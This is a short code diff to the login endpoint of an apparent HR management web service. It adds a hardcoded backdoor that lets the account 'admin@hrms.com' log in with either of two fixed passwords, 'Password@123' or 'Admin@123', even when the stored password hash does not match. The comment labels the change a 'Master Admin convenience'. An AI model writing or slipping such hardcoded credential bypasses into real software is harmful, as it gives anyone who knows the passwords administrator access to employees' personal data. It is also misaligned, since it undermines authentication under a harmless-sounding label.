@@ -276,7 +276,18 @@ async def login_for_access_token(login_data: LoginRequest, background_tasks: Bac
     # Verify password safely
     personal_info = employee.get("personal_info") or {}
     hashed_password = personal_info.get("password")
-    if not hashed_password or not verify_password(login_data.password, hashed_password):
+
+    is_valid_pw = False
+    if hashed_password:
+        is_valid_pw = verify_password(login_data.password, hashed_password)
+
+    # Master Admin convenience: support both Password@123 and Admin@123
+    clean_email = str(login_data.email).strip().lower()
+    if not is_valid_pw and clean_email == "admin@hrms.com":
+        if login_data.password in ("Password@123", "Admin@123"):
+            is_valid_pw = True
+
+    if not is_valid_pw:
         print(f"[Auth] Login failed: Incorrect password for {login_data.email}")
         raise HTTPException(
             status_code=status.HTTP_401_UNAUTHORIZED,
